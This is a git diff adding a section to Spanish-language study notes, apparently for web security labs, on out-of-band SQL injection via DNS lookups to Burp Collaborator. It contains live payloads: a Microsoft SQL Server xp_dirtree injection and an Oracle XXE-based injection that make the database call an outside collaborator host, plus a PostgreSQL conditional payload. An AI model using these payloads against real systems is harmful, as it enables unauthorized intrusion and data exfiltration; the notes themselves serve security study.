@@ -253,8 +253,26 @@ En particular en PostGre usaremos esto `TrackingId=x'%3BSELECT+CASE+WHEN+(userna
 
 **Importante:** Para esta parte, al usar el intruder en el resoruce pool hay que indicarle que el maxium concurrent requests sea 1, si no los tiempos daran mezclados y necesitamos maxima precision.
 
+### Explotar inyeccion SQL usando tecnicas out-of-band (OAST)
+Una aplicacion podria ejecutar el mismo query SQL del ejemplo anterior pero hacer de forma asincrona. La aplicacion continua procesando los requests del usuario en el thread original, y usa otro thread para ejecutar el query SQL usando la tracking cookie. La query aun es vulnerable a una inyeccion SQL, pero ninguna de las tecnicas anteriormente mencionadas funcionaria. La respuesta de la aplicacion no depende de si el query devuelve datos o no, o de si ocurre un error en la base, o del tiempo que lleve ejecutar el query.
 
+En esta situacion, usualmente es posible explotar la vulnerabilidad SQL desencadenando *out-of-band network interactions* al sistema que controlamos. Estas se pueden producir por una condicion inyectada para inferir informacion de una pieza a la vez. Tambien los datos podrian ser exfiltrados directamente en la interaccion de red.
 
+Una variedad de protocolos de red pueden ser usados con este proposito, pero tipicamente el mas efectivo es DNS (*domain name service*). Muchas redes de produccion permiten libremente el egreso de queries DNS, porque son esenciales para el funcionamiento normal de los sistemas en produccion.
+
+La herramienta mas sencilla y confiable para usar tecnicas out-of-band es Burp Collaborator. Es un servidor que provee implementaciones personalizadas de varios servicios de red, inclyendo DNS. Nos permite detectar cuándo ocurren las interacciones de red como resultado de enviar payloads individuales a una aplicacion vulnerable. Burp SUite Professional incluye un cliente integrado que esta configurado para funcionar con Burp Collaborator de entrada.
+
+Las tecnicas para desencadenar una query DNS son especificas al tipo de base de datos usada. Por ejemplo, el siguiente input en Microsoft SQL Server puede usarse para causar un DNS lookup en un dominio específico:  
+`'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`  
+Esto provoca que la basa de datos haga un lookup en el siguiente dominio:  
+`0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`  
+Se puede usar Burp Collaborator para generar un subdominio único y consultar el servidor de Burp Collaborator para confirmar cuando ocurran búsquedas DNS.
+
+Nos podemos fijar los distintos payloads en la cheat sheet. Vamos a Collaborator, damos a capoy y guardamos el link, que sustituiremos donde pone http burp collaborator subdomain (dejar el http://). En este caso usaremos  
+`TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`  
+Pues estamos en Oracle. Esto eso una entidad XML externa que todavia no vimos.  
+Tambien hay que seleccionar todo y poner Control+U para encodear la url.  
+Luego en Collaborator deberia aparecer A o AAAA, lo que significaria que puede que sea vulnerable... algo asi.
 
 ## John the Ripper
 
